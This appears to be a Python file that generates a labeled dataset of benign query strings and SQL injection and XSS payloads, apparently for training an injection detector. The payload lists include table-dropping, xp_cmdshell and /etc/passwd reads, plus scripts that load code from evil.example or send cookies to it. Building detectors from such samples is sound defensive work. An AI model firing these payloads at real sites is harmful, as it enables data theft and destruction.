from __future__ import annotations

import random
from typing import Any

BENIGN_SAMPLES = [
    "search?q=hello world",
    "user?id=42",
    "view?page=1",
    "product?id=1001",
    "profile?name=alice",
    "docs?topic=security",
    "list?sort=name&dir=asc",
    "article?slug=introduction",
    "status=active",
    "filter?price=10-20",
    "login?redirect=/home",
    "page?lang=en",
    "search?term=python programming",
    "download?file=report.pdf",
    "api?version=1.0",
    "theme?mode=dark",
    "report?from=2024-01-01&to=2024-12-31",
    "q=what is the weather",
    "category=books",
    "tag=javascript",
    "city=London&country=UK",
    "query=latest news today",
    "user=admin_name",
    "id=7&token=abc123",
    "order=desc&limit=50",
    "search=how to bake bread",
    "color=blue",
    "size=large&qty=3",
    "email=user@example.com",
    "phone=+1-555-0100",
    "zip=90210",
    "latitude=40.71&longitude=-74.00",
    "page_id=0",
    "folder=/home/user/docs",
    "name=John Doe",
    "age=30",
    "count=123456",
    "hello=world",
    "test=value",
    "sample=data",
    "query=plain text",
]

SQLI_PAYLOAD_SET = [
    "1' OR '1'='1",
    "1' OR 1=1--",
    "1' OR '1'='1' --",
    "' OR 1=1#",
    "admin'--",
    "' UNION SELECT NULL--",
    "' UNION SELECT username,password FROM users--",
    "1' AND 1=1--",
    "1' AND 1=2--",
    "1'; DROP TABLE users--",
    "'; DROP TABLE users--",
    "' OR 'x'='x",
    "' OR ''='",
    "1 OR 1=1",
    "1' OR sleep(5)--",
    "1' AND sleep(5)--",
    "' OR pg_sleep(5)--",
    "' WAITFOR DELAY '0:0:5'--",
    "1' AND (SELECT 1 FROM (SELECT SLEEP(5))a)--",
    "1' UNION SELECT 1,2,3--",
    "' UNION SELECT @@version--",
    "' AND extractvalue(1,concat(0x7e,database()))--",
    "' AND updatexml(1,concat(0x7e,user()),1)--",
    "' OR 1=1 LIMIT 1--",
    "1' OR 1=1 ORDER BY 1--",
    "1' OR '1'='1' /*",
    "' OR '1'='1' AND 'a'='a",
    '1" OR "1"="1',
    '1" OR 1=1--',
    "' OR 1 IN (SELECT 1)--",
    "1' HAVING 1=1--",
    "' GROUP BY 1--",
    "1'; EXEC xp_cmdshell('whoami')--",
    "1' OR 1=1 UNION ALL SELECT NULL,NULL--",
    "' AND 1=1 UNION SELECT NULL FROM information_schema.tables--",
    "'||(SELECT load_file('/etc/passwd'))||'",
    "' AND (SELECT COUNT(*) FROM information_schema.columns)>0--",
    "1';INSERT INTO users VALUES(1,'x','y');--",
    "' OR EXISTS(SELECT * FROM users)--",
    "1' AND ASCII(SUBSTRING((SELECT user()),1,1))>100--",
    "' AND 1=1 AND SLEEP(1)--",
    "1' OR '1'='1' UNION SELECT 1,version(),3--",
    "' OR 1=1 INTO OUTFILE '/tmp/x.txt'--",
]

XSS_PAYLOAD_SET = [
    "<script>alert(1)</script>",
    "<script>alert(document.cookie)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "javascript:alert(1)",
    "<script>prompt('x')</script>",
    "<script>confirm(1)</script>",
    '<iframe srcdoc="<script>alert(1)</script>">',
    "<details open ontoggle=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<video><source onerror=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<math><mtext><table><mglyph><style><!--</style>",
    '"><script>alert(1)</script>',
    "';alert(1);//",
    "';<script>alert(1)</script>;",
    "<script src=https://evil.example/x.js></script>",
    "<script>fetch('https://evil.example/'+document.cookie)</script>",
    '"><img src=x onerror=prompt(1)>',
    "<svg/onload=alert`1`>",
    "<img src=x onerror=\"alert('xss')\">",
    '<a href="javascript:alert(1)">click</a>',
    "<script>eval(location.hash.slice(1))</script>",
    '<object data="javascript:alert(1)">',
    "<textarea onmouseover=alert(1)>x</textarea>",
    "<keygen onfocus=alert(1) autofocus>",
    "<form><button formaction=javascript:alert(1)>x</button></form>",
    "&#60;script&#62;alert(1)&#60;/script&#62;",
    "%3Cscript%3Ealert(1)%3C/script%3E",
]


def augment(payload: str, rng: random.Random) -> list[str]:
    variants = [payload]
    variants.append(payload.upper())
    variants.append(payload.lower())
    variants.append(payload.replace(" ", "\t"))
    variants.append(payload.replace(" ", "%20"))
    variants.append(payload.replace(" ", "/**/"))
    variants.append(payload.replace("=", " = "))
    variants.append(payload.replace("<", "%3C").replace(">", "%3E"))
    seen: list[str] = []
    for v in variants:
        if v not in seen:
            seen.append(v)
    return seen


def build_injection_dataset(n: int = 5000, seed: int = 42) -> list[dict[str, Any]]:
    rng = random.Random(seed)
    rows: list[dict[str, Any]] = []
    benign_pool = list(BENIGN_SAMPLES)
    sqli_pool = list(SQLI_PAYLOAD_SET)
    xss_pool = list(XSS_PAYLOAD_SET)
    target = max(1, n // 3)
    for _ in range(target):
        base = rng.choice(sqli_pool)
        rows.append({"payload": base, "label": 1, "type": "sqli"})
        for variant in augment(base, rng):
            rows.append({"payload": variant, "label": 1, "type": "sqli"})
    for _ in range(target):
        base = rng.choice(xss_pool)
        rows.append({"payload": base, "label": 1, "type": "xss"})
        for variant in augment(base, rng):
            rows.append({"payload": variant, "label": 1, "type": "xss"})
    for _ in range(target):
        rows.append({"payload": rng.choice(benign_pool), "label": 0, "type": "benign"})
    rng.shuffle(rows)
    return rows[:n]
